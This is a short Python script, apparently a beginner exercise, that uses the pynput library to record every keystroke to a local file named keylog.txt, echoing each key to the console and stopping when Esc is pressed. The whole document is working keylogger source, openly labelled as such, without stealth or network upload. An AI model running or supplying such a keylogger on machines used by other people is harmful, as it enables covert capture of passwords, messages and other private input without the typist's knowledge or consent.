from pynput import keyboard

def keyPressed(key):
    try:
        print(f'Alphanumeric key {key.char} pressed')
        with open("keylog.txt", 'a') as logkey:
            logkey.write(key.char)
    except AttributeError:
        print(f'Special key {key} pressed')
        with open("keylog.txt", 'a') as logkey:
            logkey.write(f'[{key}]')
        if key == keyboard.Key.esc:
            print("Keylogger stopped")
            return False  # Stop the listener

if __name__ == "__main__":
    try:
        with keyboard.Listener(on_press=keyPressed) as listener:
            listener.join()  # Keeps the program running and listening for key presses
    except KeyboardInterrupt:
        print("Program terminated")
